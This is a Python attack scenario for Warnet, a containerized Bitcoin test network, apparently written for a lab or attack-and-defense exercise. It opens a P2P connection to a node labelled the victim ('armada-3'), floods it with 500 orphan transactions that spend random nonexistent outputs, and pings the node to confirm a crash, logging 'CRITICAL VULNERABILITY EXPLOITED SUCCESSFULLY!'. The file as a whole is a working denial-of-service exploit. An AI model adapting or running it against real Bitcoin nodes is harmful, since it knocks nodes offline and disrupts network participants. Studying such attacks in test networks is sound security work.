#!/usr/bin/env python3

import random
import socket
import time

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import (
    hash256,
    msg_tx,
    msg_ping,
    COIN,
    CTransaction,
    CTxOut,
    CTxIn,
    COutPoint,
    SEQUENCE_FINAL,
)
from test_framework.script import CScript
from test_framework.p2p import MAGIC_BYTES, P2PInterface
from test_framework.script import CScript, OP_TRUE
from test_framework.address import script_to_p2sh, address_to_scriptpubkey

# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.
class Orphan50(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate orphan attack using a scenario and P2PInterface"
        )
        parser.usage = "warnet run v97_orphan_span.py"
    
    def get_node(self) : 
        for n in self.nodes:
            try:
                n.getnetworkinfo()
                node = n
                break
            except Exception as e:
                continue

        return node

    # Scenario entrypoint
    def run_test(self):
        node = self.get_node()

        if node is None:
            self.log.error("No working nodes found!")
            return

        # This scenario requires the nodes to not be in IBD
        self.log.info("Starting orphan scenario")
        # create wallet miner, might already exist
        try:
            node.createwallet("miner", False, None, None, False, True, False)
        except:
            pass
        try:
            node.loadwallet("miner")
        except:
            pass

        victim = "armada-3"

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        try:
            dstaddr = socket.gethostbyname(victim)
        except socket.gaierror as e:
            raise

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        attacker = P2PInterface()
        try:
            attacker.peer_connect(
                dstaddr=dstaddr, dstport=node.p2pport, net=node.chain, timeout_factor=1
            )()
            attacker.wait_until(lambda: attacker.is_connected, check_connected=False, timeout=30)
        except Exception as e:
            self.log.error(f"Failed to connect to {victim}: {e}")
            raise

        script_pubkey = CScript([OP_TRUE])
                
        self.log.info("Sending orphan transactions to trigger crash...")

        for orphan_count in range(500):
            tx = CTransaction()
            
            fake_txid = int(f"0x{random.randint(0, 2**256-1):064x}", 16)
            
            tx.vin.append(
                CTxIn(
                    COutPoint(fake_txid, 0),
                )
            )
            tx.vout.append(
                CTxOut(int(0.00009 * COIN), address_to_scriptpubkey(node.getnewaddress()))
            )

            tx.calc_sha256()
            
            try:
                if not attacker.is_connected:
                    break
                    
                attacker.send_message(msg_tx(tx)) 
            except Exception as e:
                continue
        
        self.log.info(f"Checking if {victim} is still responsive...")
        
        try:
            ping = msg_ping()
            ping_count = 0
            while ping_count < 10:
                if not attacker.is_connected:
                    self.log.info("CRITICAL VULNERABILITY EXPLOITED SUCCESSFULLY!")
                    break
                    
                self.log.info(f"Ping: {ping_count + 1}")
                attacker.send_message(ping)
                ping_count += 1
                time.sleep(1)  

        except Exception as e:
            self.log.info("CRITICAL VULNERABILITY EXPLOITED SUCCESSFULLY!")
    


def main():
    Orphan50().main()


if __name__ == "__main__":
    main()